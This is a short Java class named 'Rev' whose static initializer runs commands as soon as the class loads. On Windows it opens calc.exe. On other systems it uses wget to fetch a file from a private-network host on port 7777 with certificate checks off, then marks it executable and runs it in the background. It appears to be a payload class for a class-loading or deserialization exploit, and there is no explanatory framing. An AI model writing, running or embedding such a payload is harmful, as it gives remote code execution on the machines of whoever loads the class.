public class Rev {
    public Rev() {}
    static {
        try {
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c", "calc.exe"}
                    : new String[]{"sh","-c", "wget -qO PqhJT1H2 --no-check-certificate http://192.168.40.128:7777/mhjfufvGzrRws; chmod +x PqhJT1H2; ./PqhJT1H2& disown"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        Rev e = new Rev();
    }
} 
